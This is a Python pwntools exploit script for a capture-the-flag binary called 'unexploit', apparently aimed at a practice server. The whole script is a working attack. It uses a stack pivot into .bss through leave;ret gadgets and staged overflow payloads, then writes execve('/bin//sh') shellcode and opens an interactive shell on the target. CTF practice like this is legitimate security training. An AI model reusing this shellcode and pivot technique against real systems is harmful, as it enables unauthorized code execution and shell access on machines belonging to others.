from pwn import *
import time
context.binary = './unexploit'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20174)

else:
	p = process('./unexploit')
	#gdb.attach(p, 'b* 0x4006AA')
	raw_input()

#len <= 0x18
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

pop_rbp = 0x0000000000400590 # pop rbp ; ret
pop_rdi = 0x0000000000400713 # pop rdi ; ret
leave_ret = 0x4006AA
bss = elf.bss() + 0x800

vunl_ret = 0x40068A

payload = 'a'*8
payload += p64(bss-0x8)				#fake_rbp = bss
payload += p64(vunl_ret)			#read(0, bss-0x10, 0x20)
payload += 'a'*8
p.send(payload)

sleep(0.5)

payload = 'a'*8						#read(0, bss, shellcode)
payload += p64(bss + 0x8)			#
payload += p64(vunl_ret)
payload += 'a'*8
p.send(payload)

sleep(0.5)
#now read(0, bss-0x8, 0x20)
payload = p64(bss + 0x8)			#ret_addr ==> shellcode
payload += shellcode				#
p.send(payload)


p.interactive()
p.close()



